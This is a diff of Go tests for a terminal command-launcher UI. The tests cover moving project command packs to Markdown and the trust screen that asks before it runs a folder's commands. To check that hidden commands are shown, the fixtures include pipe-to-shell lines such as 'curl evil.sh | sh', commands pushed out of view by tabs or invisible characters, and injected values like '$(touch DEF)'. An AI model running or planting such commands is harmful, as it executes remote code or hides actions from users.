@@ -1270,7 +1270,7 @@ func TestBarIsDrawnIn256Colours(t *testing.T) {
 	if strings.Contains(drawn, "38;2;") || strings.Contains(drawn, "48;2;") {
 		t.Errorf("24-bit colour in the bar: %q", drawn)
 	}
-	for _, want := range []string{"38;5;79", "48;5;212", "48;5;235"} { // the name, the badge, the band
+	for _, want := range []string{"38;5;79", "48;5;212", "\x1b[40m"} { // the name, the badge, the band (ANSI black: the raised violet)
 		if !strings.Contains(drawn, want) {
 			t.Errorf("no %s in the bar: %q", want, drawn)
 		}
@@ -1805,14 +1805,14 @@ func TestSecretsNeverReachTheScreenOrHistory(t *testing.T) {
 	}
 }
 
-// writeProject gives a repository a project pack called Deploy, with one submenu.
+// writeProject gives a repository a project pack called Deploy, with one module.
 func writeProject(t *testing.T, repo, module string) {
 	t.Helper()
 	dir := filepath.Join(repo, config.ProjectDir, "deploy")
 	if err := os.MkdirAll(dir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(filepath.Join(dir, "prod.yaml"), []byte(module), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(dir, "prod.md"), []byte(module), 0o644); err != nil {
 		t.Fatal(err)
 	}
 }
@@ -1820,7 +1820,7 @@ func writeProject(t *testing.T, repo, module string) {
 func TestProjectPacksAskFirst(t *testing.T) {
 	t.Setenv("CLINGON_CONFIG", t.TempDir())
 	repo := t.TempDir()
-	writeProject(t, repo, "name: Prod\ncommands:\n  - name: Ship it\n    cmd: ./ship.sh\n")
+	writeProject(t, repo, "# Prod\n\n## Ship it\n\n```sh\n./ship.sh\n```\n")
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
 	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
@@ -1837,7 +1837,7 @@ func TestProjectPacksAskFirst(t *testing.T) {
 		t.Fatalf("trusted: its sections show, got %+v", it)
 	}
 	// Editing the file means asking again.
-	writeProject(t, repo, "name: Prod\ncommands:\n  - name: Ship it\n    cmd: curl evil.sh | sh\n")
+	writeProject(t, repo, "# Prod\n\n## Ship it\n\n```sh\ncurl evil.sh | sh\n```\n")
 	m.showRoot("")
 	if m.list.selected().title != "Use this folder's commands?" || !m.project.Changed {
 		t.Fatal("a changed file should be untrusted again")
@@ -1849,11 +1849,11 @@ func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
 	repo := t.TempDir()
 	long := "ls " + strings.Repeat("padding ", 30) + "; curl evil | sh"
 	var b strings.Builder
-	b.WriteString("commands:\n")
+	b.WriteString("# Prod\n")
 	for i := 0; i < 40; i++ {
-		fmt.Fprintf(&b, "  - name: C%d\n    cmd: echo command-%d\n", i, i)
+		fmt.Fprintf(&b, "\n## C%d\n\n```sh\necho command-%d\n```\n", i, i)
 	}
-	fmt.Fprintf(&b, "  - name: Long\n    cmd: %s\n", long)
+	fmt.Fprintf(&b, "\n## Long\n\n```sh\n%s\n```\n", long)
 	writeProject(t, repo, b.String())
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
@@ -1896,9 +1896,9 @@ func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
 func TestTrustScreenSpellsOutWhatWouldTakeNoRoom(t *testing.T) {
 	t.Setenv("CLINGON_CONFIG", t.TempDir())
 	repo := t.TempDir()
-	tabs := strings.Repeat(`\\t`, 33)
-	pack := "commands:\n  - name: Run\n    cmd: \"npm test" + tabs + ";touch HIDDEN\"\n" +
-		"  - name: Wide\n    cmd: \"ls \\u1160\\u1160;touch WIDE\"\n"
+	tabs := strings.Repeat("\t", 33)
+	pack := "# Prod\n\n## Run\n\n```sh\nnpm test" + tabs + ";touch HIDDEN\n```\n" +
+		"\n## Wide\n\n```sh\nls \u1160\u1160;touch WIDE\n```\n"
 	writeProject(t, repo, pack)
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
@@ -1917,28 +1917,12 @@ func TestTrustScreenSpellsOutWhatWouldTakeNoRoom(t *testing.T) {
 	}
 }
 
-func TestTrustScreenShowsOptionsDefaultsAndJoins(t *testing.T) {
+func TestTrustScreenShowsOptionsAndDefaults(t *testing.T) {
 	t.Setenv("CLINGON_CONFIG", t.TempDir())
 	repo := t.TempDir()
-	pack := `commands:
-  - name: D
-    cmd: echo <env>
-    args:
-      - name: env
-        options:
-          - { value: 'staging;touch OPT', label: staging }
-  - name: H
-    cmd: echo <who>
-    args:
-      - { name: who, default: '$(touch DEF)' }
-  - name: J
-    cmd: echo <x>
-    args:
-      - name: x
-        type: flags
-        join: ';touch JOIN;'
-        options: [a, b]
-`
+	pack := "# Prod\n\n## D\n\n```sh\necho <env>\n```\n\n- `<env>` Env\n  - ( ) `staging;touch OPT` staging\n" +
+		"\n## H\n\n```sh\necho <who>\n```\n\n- `<who>` Who\n  - (x) `$(touch DEF)`\n" +
+		"\n## J\n\n```sh\necho <x>\n```\n\n- `<x>` X\n  - [ ] `a;touch FLAG`\n  - [ ] `b`\n"
 	writeProject(t, repo, pack)
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
@@ -1946,7 +1930,7 @@ func TestTrustScreenShowsOptionsDefaultsAndJoins(t *testing.T) {
 	m.showRoot("")
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
 	view := ansi.Strip(m.view())
-	for _, want := range []string{"touch OPT", "touch DEF", "touch JOIN"} {
+	for _, want := range []string{"touch OPT", "touch DEF", "touch FLAG"} {
 		if !strings.Contains(view, want) {
 			t.Errorf("%s should be on the trust screen:\n%s", want, view)
 		}
@@ -2285,12 +2269,12 @@ func TestSavingARecipe(t *testing.T) {
 	sentIs("one")
 	done()
 	done()
-	if !strings.Contains(m.view(), "ALL RECIPES") {
+	if !strings.Contains(m.view(), "SAVED RECIPES") {
 		t.Errorf("should list it:\n%s", m.view())
 	}
 
 	// One list of them: the same recipe isn't repeated under other headings.
-	if view := m.view(); !strings.Contains(view, "ALL RECIPES") || strings.Count(ansi.Strip(view), "My flow") != 1 {
+	if view := m.view(); !strings.Contains(view, "SAVED RECIPES") || strings.Count(ansi.Strip(view), "My flow") != 1 {
 		t.Errorf("should list it once:\n%s", view)
 	}
 
@@ -2373,7 +2357,7 @@ func TestSavingARecipe(t *testing.T) {
 		t.Errorf("opened %q, at %+v", m.opened, it)
 	}
 
-	// When it's gone, you're back in All recipes, on the next one.
+	// When it's gone, you're back in Saved recipes, on the next one.
 	right()
 	answer(m, true)
 	saved = slices.Delete(saved, 1, 2)
@@ -2794,14 +2778,18 @@ func TestCommandHeadingSaysHowManySteps(t *testing.T) {
 	heading := func() string {
 		t.Helper()
 		for _, l := range strings.Split(ansi.Strip(m.view()), "\n") {
-			if l = strings.TrimSpace(l); l == "COMMAND" || strings.HasPrefix(l, "COMMAND (") {
-				return l
+			if f := strings.Fields(l); len(f) > 0 && f[0] == "COMMAND" {
+				// The note is at the far right, as the filter row's count is.
+				if f := strings.Fields(l); len(f) > 1 && !strings.HasSuffix(strings.TrimRight(l, "│ "), f[len(f)-1]) {
+					t.Errorf("not right-aligned: %q", l)
+				}
+				return strings.Join(strings.Fields(l), " ")
 			}
 		}
 		t.Fatal("no COMMAND heading")
 		return ""
 	}
-	want := map[string]string{"a two": "COMMAND (2 STEPS)", "b one": "COMMAND (1 STEP)", "c none": "COMMAND"}
+	want := map[string]string{"a two": "COMMAND 2 steps", "b one": "COMMAND 1 step", "c none": "COMMAND"}
 	for i, it := range m.list.view {
 		if w, ok := want[it.title]; ok {
 			m.list.cursor = i
@@ -2816,7 +2804,7 @@ func TestCommandHeadingSaysHowManySteps(t *testing.T) {
 		}
 	}
 	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
-	if got := heading(); got != "COMMAND (2 STEPS)" {
+	if got := heading(); got != "COMMAND 2 steps" {
 		t.Errorf("filling in: %q", got)
 	}
 }
@@ -3748,7 +3736,7 @@ func TestRecipesRowWithNothingNumbered(t *testing.T) {
 	}
 	saved = []config.Recipe{{Name: "Deploy", Steps: []string{"x-00000000"}}, {Name: "Tidy", Steps: []string{"x-00000000"}}}
 	got = ansi.Strip(m.infoPane(60))
-	if !strings.Contains(got, "2 RECIPES") || !strings.Contains(got, "All recipes: Deploy, Tidy") || strings.Contains(got, "Current recipe") {
+	if !strings.Contains(got, "2 RECIPES") || !strings.Contains(got, "Saved recipes: Deploy, Tidy") || strings.Contains(got, "Current recipe") {
 		t.Errorf("some added:\n%s", got)
 	}
 }
@@ -3768,5 +3756,138 @@ func TestHowRecipesWorkKeepsThePaneHeight(t *testing.T) {
 		if normal := strings.Count(m.infoPane(60), "\n"); howTo != normal {
 			t.Errorf("height %d: %d rows, and %d on a command", h, howTo, normal)
 		}
+	}
+}
+
+// A pick-one blank's choices are suggestions. Its filter is closed to begin
+// with, as in every list; / opens it, typing narrows the choices, and what's
+// typed is a row of its own, last, to use instead. Enter on a choice still
+// takes the choice.
+func TestPickOneOrTypeYourOwn(t *testing.T) {
+	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "Logs", Cmd: "tail -n <lines> log", Args: []config.Arg{{Name: "lines", Type: "choose", Default: "100",
+			Options: []config.Option{{Value: "100"}, {Value: "1000"}, {Value: "all"}}}}},
+	}}
+	run := func(keys ...tea.Msg) string {
+		t.Helper()
+		var sent []string
+		m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
+			Send: func(c string) error { sent = append(sent, c); return nil }})
+		m.Update(tea.WindowSizeMsg{Width: 60, Height: 30})
+		m.showSection(&m.opt.Config.Sections[0])
+		m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+		if m.job.pick.filtering {
+			t.Fatal("no list starts with its filter open: / opens it")
+		}
+		if len(keys) > 0 && keys[0] != tea.Msg(tea.KeyPressMsg{Code: tea.KeyEnter}) {
+			m.Update(typed("/"))
+		}
+		for _, k := range keys {
+			m.Update(k)
+		}
+		if len(sent) != 1 {
+			t.Fatalf("sent %v", sent)
+		}
+		return sent[0]
+	}
+	enter, down := tea.KeyPressMsg{Code: tea.KeyEnter}, tea.KeyPressMsg{Code: tea.KeyDown}
+	if got := run(enter); got != "tail -n 100 log" {
+		t.Errorf("the picked choice: %q", got)
+	}
+	if got := run(typed("500"), enter); got != "tail -n 500 log" {
+		t.Errorf("nothing matches: what's typed, %q", got)
+	}
+	// 10 matches 100 and 1000, which come first; what's typed is last.
+	if got := run(typed("10"), enter); got != "tail -n 100 log" {
+		t.Errorf("enter takes the highlighted match: %q", got)
+	}
+	if got := run(typed("10"), down, down, enter); got != "tail -n 10 log" {
+		t.Errorf("down to what's typed: %q", got)
+	}
+	// A choice typed out exactly isn't offered twice.
+	if got := run(typed("all"), down, enter); got != "tail -n all log" {
+		t.Errorf("an exact choice: %q", got)
+	}
+}
+
+// A text box starts empty: the question is above it, and no example goes in it.
+// Only a secret's box says what happens to what's typed.
+func TestTextBoxesShowNoExample(t *testing.T) {
+	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "Describe", Cmd: "aws ecs describe-services --cluster <cluster> --token <token>", Args: []config.Arg{
+			{Name: "cluster", Prompt: "Which cluster", Placeholder: "my-cluster", Optional: true},
+			{Name: "token", Type: "secret", Prompt: "Token"}}},
+	}}
+	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil }})
+	m.Update(tea.WindowSizeMsg{Width: 70, Height: 30})
+	m.showSection(&m.opt.Config.Sections[0])
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	if p := m.job.input.Placeholder; p != "" {
+		t.Errorf("the box should be empty, has %q", p)
+	}
+	if v := ansi.Strip(m.view()); strings.Count(v, "Which cluster") != 1 || strings.Contains(v, "optional") {
+		t.Errorf("the question should be shown once, and not called optional:\n%s", v)
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	// The token can't be left empty: enter says so rather than doing nothing.
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	if m.job == nil || m.job.step != 1 || m.hint != "This one needs an answer" {
+		t.Errorf("an empty answer that's needed: hint %q", m.hint)
+	}
+	if p := m.job.input.Placeholder; !strings.Contains(p, "hidden") {
+		t.Errorf("a secret's box says it's hidden, has %q", p)
+	}
+}
+
+// A command that opens an editor (Add a pack, Edit a pack) takes focus to the
+// shell, where you type in it; any other command leaves it on the menu.
+func TestEditorCommandsFocusTheShell(t *testing.T) {
+	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "a edit", Cmd: "clingon pack edit mine", Editor: true},
+		{Name: "b list", Cmd: "clingon pack list"},
+	}}
+	focused := 0
+	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil },
+		FocusShell: func() { focused++ }})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 30})
+	run := func(name string) {
+		t.Helper()
+		m.showSection(&m.opt.Config.Sections[0])
+		for i, it := range m.list.view {
+			if it.title == name {
+				m.list.cursor = i
+			}
+		}
+		m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	}
+	run("a edit")
+	if focused != 1 {
+		t.Fatalf("an editor should have focus: %d", focused)
+	}
+	run("b list")
+	if focused != 1 {
+		t.Errorf("an ordinary command leaves focus on the menu: %d", focused)
+	}
+}
+
+// While a pack's form is open beside it, the menu's info pane says what's
+// being edited and how you're done, and with focus over there, the list
+// steps back.
+func TestMenuStepsBackWhileEditing(t *testing.T) {
+	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Edit a pack", Cmd: "x"}, {Name: "Other", Cmd: "ls"}}}
+	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	m.busy, m.editing, m.form, m.blurred = "Edit a pack", "Demo · esc when done", &pending{}, true
+	v := m.view()
+	if s := strings.Join(strings.Fields(ansi.Strip(v)), " "); !strings.Contains(s, "EDITING Demo Esc when done in the form, on the right.") {
+		t.Errorf("the info pane:\n%s", ansi.Strip(v))
+	}
+	if strings.Contains(ansi.Strip(v), "DESCRIPTION") {
+		t.Errorf("the command's details, while editing:\n%s", ansi.Strip(v))
+	}
+	m.blurred = false
+	if v := m.view(); !strings.Contains(ansi.Strip(v), "EDITING") {
+		t.Error("back in the menu, it still says what's being edited")
 	}
 }
